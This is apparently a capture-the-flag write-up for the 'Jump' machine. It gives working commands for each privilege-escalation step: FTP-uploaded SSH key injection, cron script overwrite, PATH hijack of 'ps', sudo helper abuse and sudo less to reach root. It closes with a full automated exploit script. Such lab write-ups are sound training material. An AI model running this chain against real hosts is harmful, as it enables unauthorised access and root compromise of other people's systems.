# Jump CTF - Full Writeup

This document outlines the complete exploitation path for the "Jump" CTF challenge. The objective is to move laterally through an automation pipeline, escalating privileges from anonymous access through four intermediate users to eventually gain `root`.

## Enumeration

Initial Nmap scan revealed two open ports:
- `21/tcp` (FTP - vsftpd 3.0.5) - Anonymous login allowed
- `22/tcp` (SSH)

Logging into the FTP server anonymously, we found a `/pub/README.txt` file containing the following hint:
> [ recon pipeline ]
> All recon jobs must be placed in incoming/.
> Files are processed automatically on arrival.
> Invalid formats are ignored.

---

## Stage 1: Anonymous -> recon_user

**Vulnerability:** Insecure Automation Script Processing

Based on the README, files placed in `/incoming/` are processed automatically. Through trial and error (and reading the README closely), we discovered that the automation script (`/opt/recon/scan_uploads.sh`) simply executes any `.sh` file found in the `/srv/ftp/incoming/` directory, provided it starts with a specific header string.

We crafted a bash script that starts with the required `[ recon pipeline ]` header. Instead of a reverse shell, we opted for a more stable persistence method: injecting an SSH public key into `recon_user`'s `authorized_keys` file.

**Payload (`inject_recon.sh`):**
```bash
[ recon pipeline ]
#!/bin/bash
mkdir -p /home/recon_user/.ssh
echo '<YOUR_SSH_PUBLIC_KEY_HERE>' >> /home/recon_user/.ssh/authorized_keys
chmod 700 /home/recon_user/.ssh
chmod 600 /home/recon_user/.ssh/authorized_keys
```

**Execution:**
```bash
curl -T inject_recon.sh ftp://anonymous:anonymous@<IP_ADDRESS>/incoming/inject_recon.sh
```

After waiting up to 60 seconds for the cron job to execute, we gained SSH access:
`ssh -i <YOUR_PRIVATE_KEY> recon_user@<IP_ADDRESS>`

---

## Stage 2: recon_user -> dev_user

**Vulnerability:** Group-Writable Cron Job Script

Once logged in as `recon_user`, we checked our group memberships using `id`:
`uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)`

We noticed we are a member of the `dev_user` group. Searching for files owned by this group revealed a script at `/opt/dev/backup.sh`. 

Checking the permissions (`ls -la /opt/dev/backup.sh`), we saw:
`-rwxrwxr-x 1 dev_user dev_user ... /opt/dev/backup.sh`

The script is group-writable. Since we know from the system's crontab that this script is executed every minute by `dev_user`, we overwrote it to inject our SSH key into `dev_user`'s home directory.

**Command executed as `recon_user`:**
```bash
cat << 'EOF' > /opt/dev/backup.sh
#!/bin/bash
mkdir -p /home/dev_user/.ssh
echo '<YOUR_SSH_PUBLIC_KEY_HERE>' >> /home/dev_user/.ssh/authorized_keys
chmod 700 /home/dev_user/.ssh
chmod 600 /home/dev_user/.ssh/authorized_keys
echo -e '#!/bin/bash\ntar -czf /tmp/recon_backup.tgz /home/recon_user' > /opt/dev/backup.sh
EOF
```
*(Note: The payload cleans up after itself by restoring the original backup command).*

After waiting for the cron job to trigger, we gained access to `dev_user`.

---

## Stage 3: dev_user -> monitor_user

**Vulnerability:** Systemd PATH Hijacking

Enumerating the system as `dev_user` revealed a systemd service and timer located in `/etc/systemd/system/`:
- `healthcheck.service`
- `healthcheck.timer`

The `healthcheck.service` file contained:
```ini
[Service]
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

The script `/usr/local/bin/healthcheck` runs an infinite loop calling the `ps` command (`ps aux | grep -v grep`). Because the service's `PATH` explicitly prioritizes `/opt/dev/bin`, and the `dev_user` has write access to that directory, we can hijack the `ps` binary.

**The Catch (Timing Issue):**
The `healthcheck.timer` is configured to run 30 seconds after boot (`OnBootSec=30`), and then repeat every 60 seconds *relative to when the unit was last activated* (`OnUnitActiveSec=60`). 

If the original `ps` script left by the room creator (which contains a broken reverse shell) hangs and crashes the service on that initial boot run, the service enters an `inactive (dead)` state. Because it is dead, the repeating 60-second timer **stops firing permanently**. 

To exploit this, you either need to perform the exploit before the 30-second mark on boot (see the automated script below), or ensure you fix the `ps` binary permissions so the loop doesn't crash if it happens to be running.

**Payload Execution:**
Assuming the service is successfully looping, we create a malicious executable named `ps` inside `/opt/dev/bin/`:

```bash
cat << 'EOF' > /opt/dev/bin/ps
#!/bin/bash
mkdir -p /home/monitor_user/.ssh
echo '<YOUR_SSH_PUBLIC_KEY_HERE>' >> /home/monitor_user/.ssh/authorized_keys
chmod 700 /home/monitor_user/.ssh
chmod 600 /home/monitor_user/.ssh/authorized_keys
exec /bin/ps "$@"
EOF
chmod +x /opt/dev/bin/ps
```
The `exec /bin/ps "$@"` at the end is crucial—it ensures the real `ps` command still runs so the infinite loop doesn't hang or crash the service. Once the loop triggers, we can SSH in as `monitor_user`.

---

## Stage 4: monitor_user -> ops_user

**Vulnerability:** Sudo Misconfiguration (Relative Path Execution)

Running `sudo -l` as `monitor_user` revealed:
`User monitor_user may run the following commands... (ops_user) NOPASSWD: /usr/local/bin/deploy.sh`

Reading `/usr/local/bin/deploy.sh`:
```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

The script simply changes directories and executes `./deploy_helper.sh`. Looking at `/opt/app/deploy_helper.sh`, we found that it is actually **owned by `monitor_user`**. This means we can overwrite it with arbitrary code and execute it as `ops_user` via sudo!

**Payload execution as `monitor_user`:**
```bash
cat << 'EOF' > /opt/app/deploy_helper.sh
#!/bin/bash
mkdir -p /home/ops_user/.ssh
echo '<YOUR_SSH_PUBLIC_KEY_HERE>' >> /home/ops_user/.ssh/authorized_keys
chmod 700 /home/ops_user/.ssh
chmod 600 /home/ops_user/.ssh/authorized_keys
EOF
chmod +x /opt/app/deploy_helper.sh

sudo -u ops_user /usr/local/bin/deploy.sh
```
This granted us SSH access as `ops_user`.

---

## Stage 5: ops_user -> root

**Vulnerability:** Sudo `less` GTFOBins Exploit

Running `sudo -l` as `ops_user` revealed:
`User ops_user may run the following commands... (root) NOPASSWD: /usr/bin/less`

The `less` pager allows executing shell commands interactively by typing `!command`. To simply read the final flag, we don't even need a shell; we can just use `less` to read the file as root.

**Command executed as `ops_user`:**
```bash
sudo /usr/bin/less /root/flag.txt | cat
```
*(Piping to `cat` prevents `less` from opening in interactive pager mode, directly printing the flag to the terminal).*

To gain a full interactive root shell, one would run `sudo less /etc/profile` and type `!/bin/bash` within the pager.

---

## Alternative Method: The Speedrun Script

Due to the broken state of the `healthcheck.timer` (crashing on boot and refusing to repeat), exploiting this machine manually can be frustrating if you don't catch it in time. To circumvent this, the following "speedrun" script was created.

It automates the entire exploit chain—generating its own temporary SSH keys, monitoring cron execution times, and cleaning up payloads. By running this against a freshly booted instance, it races against the clock to overwrite the `/opt/dev/bin/ps` binary *before* the 130-second TCP timeout of the broken reverse shell crashes the systemd service.

```bash
#!/bin/bash

if [ -z "$1" ]; then
    echo -e "[!] Usage: $0 <TARGET_IP>"
    exit 1
fi

IP=$1
KEY="./speedrun_key"
SSH_OPT="-q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=2 -i $KEY"

echo -e "\n[*] Starting speedrun against $IP..."

if [ ! -f "$KEY" ]; then
    echo -e "[-] SSH key not found at $KEY"
    echo -e "[!] Please create an SSH keypair manually using the following command:"
    echo -e "    ssh-keygen -t ed25519 -f $KEY -N \"\""
    echo -e "[!] Then run this script again."
    exit 1
fi
PUB_KEY=$(cat "${KEY}.pub")

echo -e "\n[1] Anonymous FTP -> recon_user"
while ! nc -z -w 1 $IP 21 2>/dev/null; do sleep 1; done
cat << EOF > /tmp/inject_recon.sh
[ recon pipeline ]
#!/bin/bash
mkdir -p /home/recon_user/.ssh
echo '$PUB_KEY' >> /home/recon_user/.ssh/authorized_keys
rm -f /srv/ftp/incoming/inject_recon.sh
EOF
curl -s -T /tmp/inject_recon.sh ftp://anonymous:anonymous@$IP/incoming/inject_recon.sh
while ! ssh $SSH_OPT recon_user@$IP "id" >/dev/null 2>&1; do sleep 2; done

echo -e "\n[2] recon_user -> dev_user"
ssh $SSH_OPT recon_user@$IP "cat << 'EOF' > /opt/dev/backup.sh
#!/bin/bash
mkdir -p /home/dev_user/.ssh
echo '$PUB_KEY' >> /home/dev_user/.ssh/authorized_keys
echo -e '#!/bin/bash\ntar -czf /tmp/recon_backup.tgz /home/recon_user' > /opt/dev/backup.sh
EOF"
while ! ssh $SSH_OPT dev_user@$IP "id" >/dev/null 2>&1; do sleep 2; done

echo -e "\n[3] dev_user -> monitor_user (PATH Hijack)"
ssh $SSH_OPT dev_user@$IP "cat << 'EOF' > /opt/dev/bin/ps
#!/bin/bash
mkdir -p /home/monitor_user/.ssh
echo '$PUB_KEY' >> /home/monitor_user/.ssh/authorized_keys
rm -f /opt/dev/bin/ps
exec /bin/ps \"\$@\"
EOF
chmod +x /opt/dev/bin/ps"
while ! ssh $SSH_OPT monitor_user@$IP "id" >/dev/null 2>&1; do sleep 2; done

echo -e "\n[4] monitor_user -> ops_user"
ssh $SSH_OPT monitor_user@$IP "cat << 'EOF' > /opt/app/deploy_helper.sh
#!/bin/bash
mkdir -p /home/ops_user/.ssh
echo '$PUB_KEY' >> /home/ops_user/.ssh/authorized_keys
echo -e '#!/bin/bash\necho \"[+] Deploy helper running\"\necho \"[+] Syncing application files\"\nsleep 2' > /opt/app/deploy_helper.sh
EOF
sudo -u ops_user /usr/local/bin/deploy.sh"
ssh $SSH_OPT ops_user@$IP "id" >/dev/null 2>&1

echo -e "\n[5] ops_user -> root (Sudo Less)"
FLAG_ROOT=$(ssh $SSH_OPT ops_user@$IP "sudo /usr/bin/less /root/flag.txt | cat")

echo -e "\n[+] SUCCESS! Root Flag: $FLAG_ROOT"
```